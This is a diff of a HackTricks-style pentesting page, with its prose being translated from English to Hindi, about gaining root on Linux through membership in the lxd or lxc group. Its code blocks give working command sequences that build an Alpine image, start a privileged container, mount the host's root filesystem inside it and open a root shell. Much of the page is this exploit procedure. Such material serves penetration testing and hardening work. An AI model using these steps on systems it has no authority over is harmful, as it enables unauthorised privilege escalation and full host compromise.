@@ -1,15 +1,14 @@
-# lxd/lxc Group - Privilege escalation
+# lxd/lxc समूह - विशेषाधिकार वृद्धि
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-If you belong to _**lxd**_ **or** _**lxc**_ **group**, you can become root
+यदि आप _**lxd**_ **या** _**lxc**_ **समूह** के सदस्य हैं, तो आप रूट बन सकते हैं
 
-## Exploiting without internet
+## इंटरनेट के बिना शोषण
 
-### Method 1
+### विधि 1
 
-You can install in your machine this distro builder: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(follow the instructions of the github):
-
+आप अपने मशीन में इस डिस्ट्रो बिल्डर को स्थापित कर सकते हैं: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(गिटहब के निर्देशों का पालन करें):
 ```bash
 sudo su
 # Install requirements
@@ -34,9 +33,7 @@ sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
 ## Using build-lxc
 sudo $HOME/go/bin/distrobuilder build-lxc alpine.yaml -o image.release=3.18
 ```
-
-Upload the files **lxd.tar.xz** and **rootfs.squashfs**, add the image to the repo and create a container:
-
+फाइलें **lxd.tar.xz** और **rootfs.squashfs** अपलोड करें, इमेज को रिपॉजिटरी में जोड़ें और एक कंटेनर बनाएं:
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -51,23 +48,19 @@ lxc list
 
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
-
 > [!CAUTION]
-> If you find this error _**Error: No storage pool found. Please create a new storage pool**_\
-> Run **`lxd init`** and **repeat** the previous chunk of commands
+> यदि आप इस त्रुटि को पाते हैं _**त्रुटि: कोई स्टोरेज पूल नहीं मिला। कृपया एक नया स्टोरेज पूल बनाएं**_\
+> **`lxd init`** चलाएं और **पिछले आदेशों के समूह को दोहराएं**
 
-Finally you can execute the container and get root:
-
+अंत में, आप कंटेनर को निष्पादित कर सकते हैं और रूट प्राप्त कर सकते हैं:
 ```bash
 lxc start privesc
 lxc exec privesc /bin/sh
 [email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
 ```
-
 ### Method 2
 
-Build an Alpine image and start it using the flag `security.privileged=true`, forcing the container to interact as root with the host filesystem.
-
+एक Alpine इमेज बनाएं और इसे `security.privileged=true` फ्लैग का उपयोग करके शुरू करें, जिससे कंटेनर को होस्ट फाइल सिस्टम के साथ रूट के रूप में इंटरैक्ट करने के लिए मजबूर किया जा सके।
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
@@ -87,5 +80,4 @@ lxc init myimage mycontainer -c security.privileged=true
 # mount the /root into the image
 lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
 ```
-
 {{#include ../../../banners/hacktricks-training.md}}
